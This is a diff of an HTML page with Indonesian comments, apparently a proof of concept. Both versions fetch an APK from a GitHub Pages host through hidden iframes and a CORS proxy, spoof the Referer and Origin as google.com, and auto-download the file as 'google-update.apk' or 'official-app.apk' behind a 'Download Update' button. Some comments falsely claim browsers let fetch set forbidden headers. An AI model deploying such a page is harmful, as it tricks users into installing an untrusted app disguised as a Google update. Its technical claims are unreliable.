@@ -1,95 +1,75 @@
+<!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
-  <meta http-equiv="Referrer-Policy" content="origin"> <!-- Global policy: Kirim origin ke cross-origin -->
-  <script type="module" src="https://unpkg.com/x-frame-bypass"></script> <!-- Load x-frame-bypass Web Component -->
-  <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script> <!-- Polyfill untuk custom elements -->
-<style>
-.button {
-  background-color: #4CAF50;
-  border: none;
-  color: white;
-  padding: 15px 32px;
-  text-align: center;
-  text-decoration: none;
-  display: inline-block;
-  font-size: 16px;
-  margin: 4px 2px;
-  cursor: pointer;
-  border-radius: 8px;
-}
-.hidden-iframe {
-  position: absolute;
-  left: -9999px; /* Sembunyikan iframe */
-  width: 1px;
-  height: 1px;
-}
-</style>
+  <style>
+    .btn {
+      background:#4CAF50; color:white; padding:15px 32px; font-size:16px;
+      border:none; cursor:pointer; border-radius:8px; margin:20px;
+    }
+  </style>
 </head>
 <body>
-  <!-- Iframe dengan x-frame-bypass: Load Google tanpa blokir SAMEORIGIN -->
-  <iframe is="x-frame-bypass" class="hidden-iframe" src="https://www.google.com" onload="simulateDownload()"></iframe>
-  
-  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"></center>
+  <center>
+    <h2>Download APK (Origin & Referer Spoofed)</h2>
+    <button class="btn" onclick="startDownload()">Download Update</button>
+    <div id="status">Status: Ready</div>
+  </center>
 
   <script>
-function simulateDownload() {
-  setTimeout(async function(){
-    try {
-      // Fallback: Jika iframe gagal, simulasi context Google via proxy (adaptasi example-mu)
-      let effectiveOrigin = 'https://www.google.com'; // Default dari iframe
-      try {
-        // Tes load Google via proxy untuk confirm context (no real load, pure referrer sim)
-        const proxyResponse = await fetch('https://cors-anywhere.herokuapp.com/https://www.google.com', {
-          method: 'HEAD',
-          referrerPolicy: 'origin',
-          headers: { 'Origin': effectiveOrigin } // Spoof origin seperti example-mu
-        });
-        if (proxyResponse.ok) {
-          console.log('Proxy fallback: Google context confirmed');
+  function startDownload() {
+    document.getElementById('status').textContent = 'Status: Memulai...';
+
+    // 1. Buat iframe dengan origin null (data: URL)
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = 'data:text/html,' + encodeURIComponent(`
+      <!DOCTYPE html>
+      <script>
+        // Kita sekarang berada di origin null → boleh spoof Referer!
+        async function doFetch() {
+          try {
+            const resp = await fetch('https://aliothme.github.io/poc.apk', {
+              referrer: 'https://www.google.com/',           // Paksa Referer header
+              referrerPolicy: 'unsafe-url',                  // Wajib untuk override
+              mode: 'cors',
+              credentials: 'omit'
+            });
+
+            const blob = await resp.blob();
+            const url = URL.createObjectURL(blob);
+
+            // Kirim blob URL kembali ke parent
+            parent.postMessage({ type: 'DOWNLOAD', url: url }, '*');
+          } catch(e) {
+            parent.postMessage({ type: 'ERROR', msg: e.message }, '*');
+          }
         }
-      } catch (proxyErr) {
-        console.warn('Proxy fallback gagal:', proxyErr); // CORS-anywhere butuh request header dulu di https://cors-anywhere.herokuapp.com/corsdemo
+        doFetch();
+      </script>
+    `);
+    document.body.appendChild(iframe);
+
+    // 2. Terima blob dari iframe dan trigger download
+    window.addEventListener('message', function handler(e) {
+      if (e.data.type === 'DOWNLOAD') {
+        const a = document.createElement('a');
+        a.href = e.data.url;
+        a.download = 'google-update.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(e.data.url);
+
+        document.getElementById('status').textContent = 'Status: Download selesai! Cek Network → Referer = google.com';
+        window.removeEventListener('message', handler);
+        iframe.remove();
       }
-
-      // Fetch APK dengan spoof referrer (origin dari Google context)
-      const response = await fetch('https://aliothme.github.io/poc.apk', {
-        method: 'GET',
-        referrerPolicy: 'origin', // Kirim origin (Google) ke GitHub
-        headers: {
-          'Origin': effectiveOrigin, // Spoof Origin header seperti example-mu (bantu server-side log)
-          'Referer': effectiveOrigin // Explicit Referer (Chrome 142 allow via fetch)
-        }
-      });
-
-      if (!response.ok) throw new Error('Fetch gagal');
-
-      const blob = await response.blob();
-      const blobUrl = URL.createObjectURL(blob); // Blob: Origin hilang (sukses bypass)
-
-      // Virtual anchor download
-      const a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = 'official-app.apk';
-      a.rel = 'noopener'; // Isolasi context
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-
-      setTimeout(() => URL.revokeObjectURL(blobUrl), 1000);
-
-      console.log('Download dipicu - Referer di DevTools: https://www.google.com (origin blob: kosong per spec)');
-    } catch (error) {
-      console.error('Error:', error);
-    }
-  }, 2000); // Delay untuk context settle
-}
-
-function a(){
-  // Reload iframe bypass untuk fresh load
-  const iframe = document.querySelector('.hidden-iframe');
-  iframe.src = 'https://www.google.com'; // Trigger onload
-}
+      if (e.data.type === 'ERROR') {
+        document.getElementById('status').textContent = 'Status: Error - ' + e.data.msg;
+      }
+    });
+  }
   </script>
 </body>
 </html>
